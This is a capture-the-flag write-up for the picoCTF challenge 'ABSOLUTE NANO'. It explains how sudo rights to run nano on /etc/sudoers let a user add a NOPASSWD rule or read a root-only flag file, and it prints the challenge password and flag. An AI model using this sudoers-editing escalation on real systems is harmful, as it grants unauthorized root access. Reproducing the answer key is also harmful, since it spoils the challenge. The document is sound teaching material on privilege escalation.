# ABSOLUTE NANO — picoCTF Writeup

**Challenge:** ABSOLUTE NANO  
**Category:** General Skills  
**Difficulty:** Medium  
**Flag:** `picoCTF{n4n0_411_7h3_w4y_d74f446b}`  
**Platform:** picoCTF 2026  
**Writeup by:** zham  

---

## Description

> You have complete power with nano. Think you can get the flag?
> `ssh -p 54414 ctf-player@crystal-peak.picoctf.net` using password `9c805ca4`

**Hint 1:** `What can you do with nano?`

---

## Background Knowledge (Read This First!)

### What is sudoers?

`/etc/sudoers` is the file that controls which users can run which commands with `sudo`. Every `sudo` permission on a Linux system is defined here. The file is normally only writable by root — but in this challenge, we are explicitly allowed to open it with nano as root, which means we can write anything we want into it.

### What is NOPASSWD in sudoers?

A sudoers rule like:

```
ctf-player ALL=(ALL) NOPASSWD: /bin/cat /home/ctf-player/flag.txt
```

Means: user `ctf-player` can run `/bin/cat /home/ctf-player/flag.txt` as any user, without a password. Adding this line to sudoers instantly grants us the ability to read flag.txt as root — bypassing the file's permission restrictions.

### Why can nano edit sudoers?

The allowed sudo rule was:

```
(ALL) NOPASSWD: /bin/nano /etc/sudoers
```

This lets us run nano as root on the sudoers file. Since nano is a text editor with full write access, and the file is opened as root, we can modify the sudoers rules to grant ourselves any additional permissions we want. This is a classic **sudo misconfiguration** — giving write access to the sudoers file itself is equivalent to giving full root access.

### GTFOBins

This technique is documented on **GTFOBins** (https://gtfobins.github.io/gtfobins/nano/) — a reference for Linux binaries that can be abused for privilege escalation. Any binary with sudo access that can write files is potentially dangerous, but nano on sudoers is one of the most direct escalations possible.

---

## Solution — Step by Step

### Step 1 — SSH into the server

```
┌──(zham㉿kali)-[~]
└─$ ssh -p 54414 ctf-player@crystal-peak.picoctf.net
ctf-player@crystal-peak.picoctf.net's password: 9c805ca4
ctf-player@challenge:~$
```

### Step 2 — Find the flag file

```
ctf-player@challenge:~$ ls
flag.txt

ctf-player@challenge:~$ cat flag.txt
cat: flag.txt: Permission denied
```

The flag file exists but we cannot read it as our current user.

### Step 3 — Check sudo permissions

```
ctf-player@challenge:~$ sudo -l
User ctf-player may run the following commands on challenge:
    (ALL) NOPASSWD: /bin/nano /etc/sudoers
```

We can run `nano /etc/sudoers` as root — meaning we can edit the sudo rules themselves.

### Step 4 — Open sudoers with nano

```
ctf-player@challenge:~$ sudo nano /etc/sudoers
```

Nano opens `/etc/sudoers` as root. Scroll to the bottom of the file and add this line:

```
ctf-player ALL=(ALL) NOPASSWD: /bin/cat /home/ctf-player/flag.txt
```

Save with `Ctrl+O` → `Enter` → `Ctrl+X` to exit.

### Step 5 — Read the flag using the new sudo rule

```
ctf-player@challenge:~$ sudo cat /home/ctf-player/flag.txt
picoCTF{n4n0_411_7h3_w4y_d74f446b}
```

The new sudoers rule lets us run `cat` as root on `flag.txt`, bypassing the permission restriction.

---

## Alternative Method — Read directly inside nano

Instead of adding a new sudoers rule, you can read the flag directly from within nano itself:

1. Run `sudo nano /etc/sudoers`
2. Inside nano, press `Ctrl+R` (Read File)
3. Type `/home/ctf-player/flag.txt` and press Enter
4. The contents of flag.txt are inserted into the nano buffer — the flag is visible right there

This skips the need to save sudoers and run a second command entirely.

---

## What the Sudoers Line Means

```
ctf-player ALL=(ALL) NOPASSWD: /bin/cat /home/ctf-player/flag.txt
│           │    │       │       └── exact command allowed
│           │    │       └── no password required
│           │    └── run as any user
│           └── from any host
└── this user
```

Every field must be exact. The path `/bin/cat` and argument `/home/ctf-player/flag.txt` are locked to what we specified — we cannot run `sudo cat /etc/passwd` with this rule.

---

## Tools Used

| Tool | Purpose | Level |
|------|---------|-------|
| `ssh` | Connect to the challenge server | Easy |
| `sudo -l` | Discover the allowed sudo command | Easy |
| `sudo nano /etc/sudoers` | Edit sudoers as root to grant new permissions | Medium |
| `sudo cat flag.txt` | Read the flag using the newly added rule | Easy |

---

## Key Takeaways

- **`sudo -l` is always the first thing to check** when you cannot access a file — it reveals exactly what elevated commands are available
- **Giving sudo access to a text editor on a sensitive file is as dangerous as giving root access** — nano on sudoers means full control of all sudo rules
- **`/etc/sudoers` controls all privilege escalation** on a Linux system — write access to it is equivalent to root
- **GTFOBins** documents nano as a privilege escalation vector — any file editor with sudo can be abused to read or write restricted files
- The flag `n4n0_411_7h3_w4y` is "nano all the way" — nano was both the tool given and the entire path to the flag
